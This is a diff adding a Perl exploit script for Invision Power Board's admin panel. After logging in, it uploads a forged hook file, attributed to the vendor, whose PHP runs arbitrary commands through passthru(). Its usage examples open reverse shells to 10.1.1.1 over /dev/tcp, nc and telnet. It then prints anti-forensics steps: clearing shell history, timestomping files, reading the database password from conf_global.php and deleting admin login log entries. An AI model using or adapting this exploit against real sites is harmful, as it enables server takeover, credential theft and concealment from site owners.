@@ -1,0 +1,319 @@
+#!/usr/bin/env perl
+
+use MIME::Base64;
+use Getopt::Long;
+use Getopt::Std;
+use IO::Socket;
+use URI::Escape;
+use LWP::UserAgent;
+use HTTP::Request::Common;
+use HTTP::Cookies::Netscape;
+use Digest::MD5 qw(md5_hex md5);
+use strict;
+
+$| = 1; # unbuffered output
+
+my ($url,$ua,$host,$content,$user,$passwd,$port,$debug);
+my ($enter, $u, $details, $uninstall, $page);
+our($opt_p,$opt_h,$opt_c,$opt_i,$opt_U,$opt_P,$opt_t,$opt_s,$opt_d,$opt_D);
+
+
+sub usage{
+  print "
+usage: $0 -i<IP> -p<port> -U<user> -P<password> -D<directory> -c<commands>
+  
+  -i IP
+  -p # [default port = 80]
+  -t [determine if URL exists, commands are not sent]  
+  -h help
+  -c \"Commands\"
+  -s [request https, default is http]
+  -d debug
+  -D directory
+  -U user
+  -P password
+
+Examples:
+Window 1: nc -vv -l -p 101
+Window 2: nc -vv -l -p 102
+Window 3: $0 -Uadmin -Ppassword -i127.0.0.1 -Dipboard -c\"sh</dev/tcp/10.1.1.1/101>&0 2>&0\"
+Window 3: $0 -Uadmin -Ppassword -i127.0.0.1 -Dipboard -c\"sleep 500|nc 10.1.1.1 101|sh|nc 10.1.1.1 102\"
+Window 3: $0 -Uadmin -Ppassword -i127.0.0.1 -Dipboard -c\"sleep 500|/usr/bin/telnet 10.1.1.1 101|sh|/usr/bin/telnet 10.1.1.1 102\"
+";
+  exit;
+}
+
+getopts('c:i:u:p:hstU:dP:D:');
+
+if($opt_h || !$opt_i || !$opt_D || !$opt_c && !$opt_t){
+  usage();
+}
+
+if($opt_d){
+  $debug = 1;
+}
+
+if(!$opt_s){
+  if(!$opt_p){
+    $port = 80;
+  }
+  else {
+    $port = $opt_p;
+  }
+  $host = "http://$opt_i:$port/$opt_D";
+}
+else{
+  if(!$opt_p){
+    $port = 443;
+  }
+  else {
+    $port = $opt_p;
+  }
+  $host = "https://$opt_i:$port/$opt_D";
+}
+
+$ua = LWP::UserAgent->new;
+$ua->cookie_jar( HTTP::Cookies::Netscape->new(file => "./cookie.jar", ignore_discard => 1) ); #file does not work all the time
+$ua->agent("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
+
+open(OUT,">>", $0 . ".out");
+
+if($opt_t){
+  $url = $host . "/";
+  $u = get($url);
+  print $u;
+}
+if(!$opt_t){
+  ##################################
+  # login with creds/get cookie
+  $user = "admin";
+  $passwd = "nothing";
+  if(defined($opt_U)){
+    $user = $opt_U;
+  }
+  if(defined($opt_P)){
+    $passwd = $opt_P;
+  }
+  $url = $host . "/admin/index.php?adsess=&app=core&module=login&do=login-complete";
+  $content = "qstring=&username="  . $user . "&password=" . $passwd;
+  $u = post($url,$content);
+  print $u;
+  print OUT $u;
+  ($enter) = $u =~ m/adsess=(\S+)&'>\( Click here if you do not wish to wait/; 
+  print "enter $enter\n";
+  
+  if(length($enter) <= 0){
+    print "\nLogin failed. Exiting.\n";
+    exit;
+  }
+
+  $url = $host . "/admin/index.php?adsess=" . $enter . "";
+  $u = get($url);
+  print $u;
+  print OUT $u;
+
+  write_page($opt_c);
+  $url = $host . "/admin/index.php?adsess=" . $enter . "&app=core&module=applications&section=hooks&do=install_hook";
+  $u = post_form_data($url);
+  print $u;
+  print OUT $u;
+
+  $url = $host . "/admin/index.php?adsess=" . $enter . "&app=core&module=applications&section=hooks&do=hooks_overview";
+  $u = get($url);
+  print $u;
+  print OUT $u;
+  
+  ($details) = $u =~ m/\/admin\/index.php?(.*?)'>View Full Details/; 
+  print "\ndetails $details\n";
+  $details =~ s/&amp;/&/g;
+  print "\ndetails $details\n";
+
+  ($uninstall) = $u =~ m/\/admin\/index.php?(.*?)"\);'>Uninstall Hook/; 
+  print "\nuninstall $uninstall\n";
+  $uninstall =~ s/&amp;/&/g;
+
+  $url = $host . "/admin/index.php" . $details;
+  $u = get($url);
+  print $u;
+  print OUT $u;
+  
+  ($page) = $u =~ m/(boardIndexpage_.*php)/; 
+  print "\npage $page\n";
+
+  $url = $host . "/hooks/" . $page;
+  $u = get($url);
+
+  print $u;
+  print OUT $u;
+  print "\n$0 will pause for 10 seconds\n";
+  sleep 10;
+  
+  $url = $host . "/admin/index.php" . $uninstall;
+  $u = get($url);
+  print $u;
+  print OUT $u;
+  
+  $url = $host . "/admin/index.php?adsess=" . $enter . "&module=login&do=login-out";
+  $u = get($url);
+  print $u;
+  print OUT $u;
+
+  print "
+
+unset HISTFILE HISTFILESIZE HISTSIZE
+date; date -u
+ls -lart
+touch -r boardIndexCalendar_* .
+ls -lart ..
+touch -r boardIndexCalendar_* ../uploads 
+cat ../conf_global.php
+
+export H=`grep sql_host ../conf_global.php|cut -d\\' -f4`
+export D=`grep sql_database ../conf_global.php|cut -d\\' -f4`
+export U=`grep sql_user ../conf_global.php|cut -d\\' -f4`
+export P=`grep sql_pass ../conf_global.php|cut -d\\' -f4`
+export T=`grep sql_tbl_prefix ../conf_global.php|cut -d\\' -f4`admin_login_logs
+echo \$H
+echo \$D
+echo \$U
+echo \$P
+echo \$T
+mysql \$D --host=\$H --user=\$U --password=\"\$P\" -e \"select * from \$T\"|tail
+mysql \$D --host=\$H --user=\$U --password=\"\$P\" -e \"select * from \$T where length(admin_post_details) < 215\"
+mysql \$D --host=\$H --user=\$U --password=\"\$P\" -e \"delete from \$T where length(admin_post_details) < 215\"
+mysql \$D --host=\$H --user=\$U --password=\"\$P\" -e \"select * from \$T where length(admin_post_details) < 215\"
+
+";
+
+}
+
+##################################
+sub get{
+  my($url) = @_;
+
+  print "\nGET URL: $url\n\n";
+  my $req = HTTP::Request->new(GET => $url);
+  my $res = $ua->request($req);
+  return response($res,$url);
+}
+  
+##################################
+sub post{
+  my($url,$content) = @_;
+  
+  print "\nPOST URL: $url\n";
+  print "\nContent: $content\n\n";
+  my $req = HTTP::Request->new(POST => $url);
+
+  $req->content_type('application/x-www-form-urlencoded');
+  $req->content($content);
+
+  my $res = $ua->request($req);
+  return response($res,$url);
+}
+
+##################################
+sub post_form_data{
+  my($url) = @_;
+  
+  print "\nPOST URL: $url\n";
+  print "\nContent: %content\n\n";
+  my $req = HTTP::Request->new;
+
+  #$req->content_type('multipart/form-data');
+  #$req->content(%content);
+
+  my $res = $ua->request(POST $url,
+  		 	Content_Type => 'form-data',
+			Content      => [ 
+					FILE_UPLOAD => ["page.xml"],
+					]);
+  return response($res,$url);
+}
+
+##################################
+sub response{
+  my($req,$url) = @_;
+  
+  #print "\nURL: $url\n\n";
+  print $req->status_line, "\n";
+  print $req->headers_as_string,"\n";
+  print OUT $req->content;
+ 
+  return($req->content);
+}
+
+sub write_page{
+  my($cmd) = @_;
+
+  open(FILE,">", "page.xml");
+  my $data ='<?xml version="1.0" encoding="utf-8"?>
+<hookexport>
+  <hookdata>
+    <config>
+      <hook_name>page</hook_name>
+      <hook_desc>Shows page on board index</hook_desc>
+      <hook_author>Invision Power Services, Inc</hook_author>
+      <hook_email/>
+      <hook_website/>
+      <hook_update_check/>
+      <hook_requirements><![CDATA[a:4:{s:20:"hook_ipb_version_min";i:31000;s:20:"hook_ipb_version_max";i:0;s:20:"hook_php_version_min";s:0:"";s:20:"hook_php_version_max";s:0:"";}]]></hook_requirements>
+      <hook_version_human>1.0.0</hook_version_human>
+      <hook_version_long>10000</hook_version_long>
+      <hook_extra_data><![CDATA[a:2:{s:7:"display";N;s:8:"database";a:0:{}}]]></hook_extra_data>
+      <hook_key>unread</hook_key>
+    </config>
+  </hookdata>
+  <hookfiles>
+    <file>
+      <hook_file_real>boardIndexpage.php</hook_file_real>
+      <hook_type>templateHooks</hook_type>
+      <hook_classname>boardIndexpage</hook_classname>
+      <hook_data><![CDATA[a:7:{s:12:"dataLocation";s:0:"";s:15:"classToOverload";s:0:"";s:9:"skinGroup";s:11:"skin_boards";s:12:"skinFunction";s:18:"boardIndexTemplate";s:4:"type";s:7:"foreach";s:2:"id";s:11:"side_blocks";s:8:"position";s:9:"outer.pre";}]]></hook_data>
+      <hooks_source><![CDATA[<?php
+
+ passthru(\''. $cmd . ' &\');
+
+class boardIndexNotifications
+{
+	public $registry;
+	
+	public function __construct()
+	{
+        /* Make registry objects */
+		$this->registry		=  ipsRegistry::instance();
+		$this->memberData	=& $this->registry->member()->fetchMemberData();
+	}
+	
+	public function getOutput()
+	{
+		//-----------------------------------------
+		// Notifications library
+		//-----------------------------------------
+		
+		$classToLoad		= IPSLib::loadLibrary( IPS_ROOT_PATH . \'/sources/classes/member/notifications.php\', \'notifications\' );
+		$notifyLibrary		= new $classToLoad( $this->registry );
+		$notifyLibrary->setMember( $this->memberData );
+		return $notifyLibrary->getBoardIndexHook();
+	}
+}]]></hooks_source>
+    </file>
+  </hookfiles>
+  <hookextras_settings/>
+  <hookextras_language/>
+  <hookextras_modules/>
+  <hookextras_help/>
+  <hookextras_templates/>
+  <hookextras_css/>
+  <hookextras_tasks/>
+  <hookextras_database_create/>
+  <hookextras_database_alter/>
+  <hookextras_database_update/>
+  <hookextras_database_insert/>
+</hookexport>
+';
+  print FILE $data;
+  close(FILE);
+
+  
+}
